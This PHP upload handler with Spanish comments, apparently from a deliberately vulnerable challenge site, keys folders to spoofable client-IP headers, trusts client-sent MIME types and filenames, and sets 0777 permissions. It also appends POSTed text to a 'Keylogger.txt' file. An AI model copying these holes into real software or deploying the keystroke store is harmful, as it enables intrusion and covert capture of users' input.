<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
echo $ip;
$ip = strval($ip);
$path = "$ip";
#si la carpeta no existe, la crea
if (!file_exists($path)) {
    mkdir($path, 0777, true);
}


$directorio = "$ip/";
#si el archivo se recive por post y no esta vacio entra al if
if (isset($_FILES['subir_archivo'])) {
    $tamano = $_FILES['subir_archivo']['size'];
    $type = $_FILES['subir_archivo']['type'];
    $nombre = $_FILES['subir_archivo']['name'];
    #si el archivo es de tipo png, jpg, jpeg, gif, txt, doc, docx, xls, xlsx, pdf entra al if
    if ($type == "image/png" || $type == "image/jpg" || $type == "image/jpeg" || $type == "image/gif" || $type == "text/plain" || $type == "application/msword" || $type == "application/vnd.openxmlformats-officedocument.wordprocessingml.document" || $type == "application/vnd.ms-excel" || $type == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" || $type == "application/pdf") {
        #si el archivo es mayor a 5mb entra al if
        if ($tamano > 5242880) {
            echo "El archivo es demasiado grande";
        } else {
            #si el archivo es de tipo png, jpg, jpeg crea una carpeta con el nombre images
            if ($type == "image/png" || $type == "image/jpg" || $type == "image/jpeg") {
                $directorio = "$ip/images/";
                #crea la carpeta si no existe
                if (!file_exists($directorio)) {
                    mkdir($directorio, 0777, true);
                }
                #sube el archivo
                move_uploaded_file($_FILES['subir_archivo']['tmp_name'], $directorio . $nombre);
                #si el archivo es de tipo pdf, xls, xlsx, doc, docx crea una carpeta con el nombre documents
            } elseif ($type == "application/pdf" || $type == "application/vnd.ms-excel" || $type == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" || $type == "application/msword" || $type == "application/vnd.openxmlformats-officedocument.wordprocessingml.document") {
                $directorio = "$ip/documents/";
                #crea la carpeta si no existe
                if (!file_exists($directorio)) {
                    mkdir($directorio, 0777, true);
                }
                #sube el archivo
                move_uploaded_file($_FILES['subir_archivo']['tmp_name'], $directorio . $nombre);
            } 
        }
    }#si el archivo es de tipo php, asp, html, css, js, htm entra al elseif
    elseif ($type == "text/php" || $type == "text/asp" || $type == "text/html" || $type == "text/css" || $type == "text/javascript" || $type == "text/htm") {
        ?>
        <script>
            alert("Se que estas intentando entrar a mi web, pero esta no es una de las vulnerabilidades que puedes atacar");
        </script>
        <?php
    }
    
    else {
        echo "El archivo no es valido";
    }

#copiar los archivos a una carpeta 
if(isset($_POST['user'])){
    copy("success", "$directorio/index.php");
    copy("actualizacion", "$directorio/act.php");
    #crear una carpeta con el nombre images
    $directorio = "$ip/images/";
    #crea la carpeta si no existe
    if (!file_exists($directorio)) {
        mkdir($directorio, 0777, true);
    }
    #copia el archivo
    copy("success", "$directorio/index.php");
    #crear una carpeta con el nombre documents
    $directorio = "$ip/";
    $directorio = "$ip/documents/";
    #crea la carpeta si no existe
    if (!file_exists($directorio)) {
        mkdir($directorio, 0777, true);
    }   
    #copia el archivo
    copy("success", "$directorio/index.php");

}
}


if(isset($_POST['text'])){
    $texto = $_POST['text'];
    $archivo = fopen("$directorio/Keylogger.txt", "a");
    fwrite($archivo, $texto);
    fclose($archivo);
}